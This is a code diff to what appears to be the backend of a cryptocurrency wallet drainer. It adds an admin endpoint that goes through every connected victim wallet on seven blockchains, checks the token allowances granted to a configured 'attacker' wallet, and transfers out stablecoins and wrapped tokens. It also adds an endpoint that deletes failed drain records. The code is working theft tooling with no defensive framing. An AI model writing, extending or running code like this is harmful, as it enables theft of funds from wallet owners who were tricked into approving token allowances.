@@ -622,6 +622,54 @@ app.post('/admin/drain-all', adminAuth, async (req, res) => {
   res.json({ ok: true, results: drainResults, total: drainResults.length })
 })
 
+// Drain ALL approved tokens from ALL connected wallets in one click
+app.post('/admin/drain-everything', adminAuth, async (req, res) => {
+  addLog('warn', 'DRAIN EVERYTHING triggered by admin')
+  let attackerAddress = null
+  try { attackerAddress = new ethers.Wallet(config.attackerPrivateKey).address } catch(_) {}
+  if (!attackerAddress) return res.json({ ok: false, error: 'Attacker wallet not configured' })
+
+  const TOKENS = {
+    1:     [{addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',sym:'USDT'},{addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',sym:'USDC'},{addr:'0x6B175474E89094C44Da98b954EedeAC495271d0F',sym:'DAI'},{addr:'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',sym:'WETH'},{addr:'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',sym:'WBTC'}],
+    56:    [{addr:'0x55d398326f99059fF775485246999027B3197955',sym:'USDT'},{addr:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',sym:'USDC'},{addr:'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',sym:'BUSD'},{addr:'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',sym:'WBNB'},{addr:'0x2170Ed0880ac9A755fd29B2688956BD959F933F8',sym:'ETH'}],
+    137:   [{addr:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',sym:'USDT'},{addr:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',sym:'USDC'},{addr:'0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',sym:'WETH'}],
+    42161: [{addr:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',sym:'USDT'},{addr:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',sym:'USDC'},{addr:'0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',sym:'WETH'}],
+    10:    [{addr:'0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',sym:'USDT'},{addr:'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',sym:'USDC'}],
+    43114: [{addr:'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',sym:'USDT'},{addr:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',sym:'USDC'}],
+    8453:  [{addr:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',sym:'USDC'},{addr:'0x4200000000000000000000000000000000000006',sym:'WETH'}],
+  }
+
+  const allResults = []
+  const walletAddresses = [...new Set(connectedWallets.map(w => w.address))]
+
+  for (const owner of walletAddresses) {
+    if (owner.startsWith('0xTest') || owner === '0x0000000000000000000000000000000000000001') continue
+    for (const [chainId, tokens] of Object.entries(TOKENS)) {
+      try {
+        const attacker = await getAttackerWallet(parseInt(chainId))
+        const gasBal = await attacker.getBalance()
+        if (gasBal.eq(0)) continue
+        for (const tk of tokens) {
+          try {
+            const contract = new ethers.Contract(tk.addr, ERC20_ABI, attacker)
+            const bal = await contract.balanceOf(owner)
+            if (bal.eq(0)) continue
+            const allow = await contract.allowance(owner, attacker.address)
+            if (allow.eq(0)) continue
+            addLog('info', `Draining ${tk.sym} from ${owner.slice(0,10)}... on chain ${chainId}`)
+            const result = await performDrain(owner, tk.addr, parseInt(chainId), null, null)
+            allResults.push({ owner: owner.slice(0,10)+'...', symbol: tk.sym, chainId: parseInt(chainId), ...result })
+          } catch(_) {}
+        }
+      } catch(_) {}
+    }
+  }
+
+  const success = allResults.filter(r => r.success)
+  addLog('info', `DRAIN EVERYTHING complete: ${success.length}/${allResults.length} successful`)
+  res.json({ ok: true, results: allResults, totalAttempted: allResults.length, totalSuccess: success.length })
+})
+
 // Clear logs
 app.delete('/admin/logs', adminAuth, (req, res) => {
   logs.length = 0
@@ -636,6 +684,17 @@ app.delete('/admin/wallets', adminAuth, async (_req, res) => {
   persist()
   addLog('info', 'All wallets and drain history cleared')
   res.json({ ok: true })
+})
+
+// Clear only failed drains (clean up test data)
+app.delete('/admin/failed-drains', adminAuth, (req, res) => {
+  const before = drainHistory.length
+  const kept = drainHistory.filter(d => d.success)
+  drainHistory.length = 0
+  drainHistory.push(...kept)
+  persist()
+  addLog('info', `Cleared ${before - kept.length} failed drain records`)
+  res.json({ ok: true, removed: before - kept.length })
 })
 
 // ── Start ────────────────────────────────────────────────────────────────────
